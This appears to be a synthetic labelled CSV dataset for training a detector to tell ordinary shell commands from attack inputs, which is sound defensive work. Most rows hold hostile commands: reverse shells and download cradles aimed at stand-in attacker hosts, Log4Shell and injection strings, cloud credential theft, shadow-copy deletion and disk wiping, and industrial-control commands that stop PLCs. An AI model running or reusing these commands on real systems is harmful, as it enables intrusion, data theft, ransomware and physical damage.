timestamp,src_ip,input,label
2026-01-20T18:06:49.583995,220.160.167.187,make build,Normal_Business_Ops
2026-01-20T18:06:49.584995,6.149.40.149,uptime,Normal_Business_Ops
2026-01-20T18:06:49.646819,11.13.88.89,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.657633,16.43.1.141,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.602715,33.145.172.160,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.646819,14.44.90.39,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.605716,67.98.76.151,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.619742,150.204.134.203,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.619055,143.215.96.197,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.585564,69.222.99.104,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T18:06:49.656632,73.143.135.52,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.614343,3.154.83.68,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.643231,148.214.203.142,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.641230,179.93.70.55,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.645823,71.184.229.118,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.645823,61.122.89.164,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.592206,214.161.108.249,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T18:06:49.636464,186.34.46.189,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.646819,153.122.188.15,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.644231,184.143.75.243,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.588562,103.126.148.72,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.638465,118.183.81.236,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.649821,175.202.113.50,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.576929,133.191.104.213,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.590224,84.156.48.123,git branch,Normal_Business_Ops
2026-01-20T18:06:49.584995,13.189.231.87,history | tail -n 20,Normal_Business_Ops
2026-01-20T18:06:49.600538,150.227.73.183,make build,Normal_Business_Ops
2026-01-20T18:06:49.631464,114.208.136.163,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.588562,61.63.70.28,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.602715,116.136.239.238,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.639724,59.167.207.241,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.646819,128.209.60.198,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.617074,124.15.40.178,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.639724,129.91.80.39,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.578927,1.28.134.56,npm start,Normal_Business_Ops
2026-01-20T18:06:49.605716,190.125.222.30,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.636464,200.239.238.172,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.612343,176.122.110.88,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.654619,46.67.31.137,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.580022,23.5.48.193,git remote -v,Normal_Business_Ops
2026-01-20T18:06:49.631464,155.61.117.12,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.626851,2.117.119.1,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.576929,118.233.5.193,make build,Normal_Business_Ops
2026-01-20T18:06:49.631464,134.107.33.185,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.592206,35.184.225.84,git status,Normal_Business_Ops
2026-01-20T18:06:49.623750,123.245.225.3,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.622713,27.190.200.126,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.641230,87.103.78.151,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.647820,181.155.54.72,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.611343,151.254.38.10,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.630463,177.79.136.153,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.655127,54.195.20.78,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.654619,210.37.251.245,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.651526,112.198.71.150,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.588562,103.79.172.107,whoami,Normal_Business_Ops
2026-01-20T18:06:49.578927,142.185.56.94,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T18:06:49.621712,26.211.172.244,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.608346,188.56.163.44,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.590224,7.77.11.155,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.576929,149.124.137.97,git branch,Normal_Business_Ops
2026-01-20T18:06:49.576420,127.127.195.24,uptime,Normal_Business_Ops
2026-01-20T18:06:49.604716,49.30.124.206,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.601211,217.229.33.175,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.621712,33.108.218.199,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.587562,104.12.150.213,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.577927,139.39.56.214,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.647820,85.210.29.186,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.581995,54.142.8.3,systemctl status docker,Normal_Business_Ops
2026-01-20T18:06:49.642230,42.139.179.239,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.647820,199.185.205.160,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.637464,221.81.220.189,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.624262,220.84.16.240,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.640252,197.164.70.67,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.620713,221.39.229.192,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.591206,183.111.212.17,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.613343,100.112.234.119,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.610343,156.141.112.104,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.593923,205.91.173.62,df -h,Normal_Business_Ops
2026-01-20T18:06:49.608346,18.251.246.225,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.595541,168.204.185.105,history | tail -n 20,Normal_Business_Ops
2026-01-20T18:06:49.608346,11.247.68.48,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.601728,184.135.97.180,history | tail -n 20,Normal_Business_Ops
2026-01-20T18:06:49.585564,139.22.250.31,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.649821,37.202.30.41,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.576420,108.145.192.245,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.599537,104.80.101.220,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.627851,191.211.9.172,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.601728,181.222.75.166,systemctl status docker,Normal_Business_Ops
2026-01-20T18:06:49.647820,179.14.204.135,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.618055,165.57.208.137,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.585564,14.147.136.215,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.650820,13.62.120.241,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.606716,166.164.212.168,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.580022,110.153.213.218,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.605716,223.221.87.146,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.630463,215.209.224.253,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.611343,66.250.229.121,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.602715,80.166.118.3,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.577927,203.228.0.122,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.615344,46.74.168.214,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.615344,4.190.139.70,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.637464,74.78.63.64,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.612343,102.83.123.147,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.652043,179.29.3.236,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.601211,205.131.106.229,df -h,Normal_Business_Ops
2026-01-20T18:06:49.594923,52.12.233.236,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.577927,220.192.27.154,git branch,Normal_Business_Ops
2026-01-20T18:06:49.613343,186.87.81.242,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.578927,87.71.52.25,uptime,Normal_Business_Ops
2026-01-20T18:06:49.653031,73.233.65.239,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.637464,140.244.104.126,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.612343,5.16.83.135,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.634463,61.221.222.242,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.605716,55.94.108.251,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.608346,47.19.103.58,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.644231,21.8.76.47,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.625855,216.188.47.130,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.595541,39.67.151.28,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.624262,132.241.23.99,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.580995,133.66.33.20,git merge main,Normal_Business_Ops
2026-01-20T18:06:49.580022,221.21.153.83,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.615344,211.201.134.226,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.610343,8.184.253.139,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.640252,107.181.222.50,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.629483,41.112.114.167,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.624262,20.15.254.7,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.653031,126.234.166.163,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.611343,197.55.148.203,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.655635,52.11.86.65,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.592206,201.109.88.115,git status,Normal_Business_Ops
2026-01-20T18:06:49.648870,75.174.59.42,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.593923,20.48.50.8,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.595541,31.222.251.173,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.634463,68.43.98.51,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.655127,162.238.137.13,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.636464,205.87.197.234,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.587562,65.158.195.173,systemctl status docker,Normal_Business_Ops
2026-01-20T18:06:49.589562,82.162.38.44,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.582995,56.94.88.212,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.599537,156.121.147.82,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.619742,18.98.74.201,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.577927,101.118.156.38,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.609343,219.101.176.25,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.645823,206.189.26.114,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.627851,23.117.119.130,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.627851,155.90.180.125,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.592928,10.152.217.156,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.644231,76.133.124.214,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.642230,69.18.17.56,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.623750,57.252.27.101,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.633463,77.45.251.130,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.633463,172.207.133.224,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.616344,174.125.68.48,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.641230,216.6.24.205,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.644231,10.244.190.43,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.603716,62.250.72.159,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.654619,135.223.190.128,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.644231,9.83.236.83,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.578927,123.28.183.234,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.631464,183.181.39.243,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.649821,147.157.109.161,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.625855,176.89.184.179,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.580022,135.163.85.195,whoami,Normal_Business_Ops
2026-01-20T18:06:49.648870,177.67.46.237,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.620713,188.61.125.151,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.617074,26.176.35.109,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.619055,85.207.30.208,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.649821,7.242.35.163,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.582995,129.44.79.60,git push origin main,Normal_Business_Ops
2026-01-20T18:06:49.582995,107.125.16.38,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.613343,117.220.91.250,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.613343,139.172.194.143,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.633463,163.66.114.130,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.601211,98.149.127.77,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.601728,89.28.135.31,history | tail -n 20,Normal_Business_Ops
2026-01-20T18:06:49.580995,222.142.208.149,git branch,Normal_Business_Ops
2026-01-20T18:06:49.592928,220.192.1.212,git status,Normal_Business_Ops
2026-01-20T18:06:49.645231,169.159.82.168,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.581995,149.198.138.162,git push origin main,Normal_Business_Ops
2026-01-20T18:06:49.647820,165.181.26.92,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.610343,37.208.117.167,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.634463,209.242.43.121,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.642230,198.227.146.212,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.625855,210.92.28.46,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.580022,90.213.113.63,git merge main,Normal_Business_Ops
2026-01-20T18:06:49.625855,164.149.51.143,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.639724,170.35.66.63,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.588562,127.144.205.119,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.648870,151.129.47.75,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.583995,122.84.171.227,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.611343,47.81.128.50,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.656632,51.136.121.210,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.633463,133.168.26.233,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.649821,203.54.165.153,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.608346,221.67.47.27,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.656632,42.85.171.105,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.615344,63.78.199.188,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.577927,107.177.37.176,npm start,Normal_Business_Ops
2026-01-20T18:06:49.596536,30.100.73.168,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.654031,193.225.196.106,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.654031,83.31.215.61,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.645231,218.213.139.99,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.617074,52.144.178.188,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.608346,99.239.210.63,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.601728,31.245.188.222,git pull,Normal_Business_Ops
2026-01-20T18:06:49.579998,165.116.155.246,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.631464,6.74.252.78,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.612343,192.104.32.93,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.580022,7.254.32.44,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.588562,44.213.16.51,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T18:06:49.599537,151.94.154.215,git add .,Normal_Business_Ops
2026-01-20T18:06:49.586561,79.70.34.242,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.656632,64.193.184.245,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.633463,45.43.97.113,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.582995,205.187.202.138,git branch,Normal_Business_Ops
2026-01-20T18:06:49.595541,76.190.100.175,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.580995,210.88.2.112,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.626851,189.184.221.105,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.653031,194.195.36.41,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.576929,65.242.7.214,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.620713,27.178.89.120,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.635464,148.203.18.42,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.627851,29.233.18.218,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.580995,72.156.86.182,whoami,Normal_Business_Ops
2026-01-20T18:06:49.604716,55.122.248.182,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.613343,191.249.91.66,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.609343,23.237.52.19,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
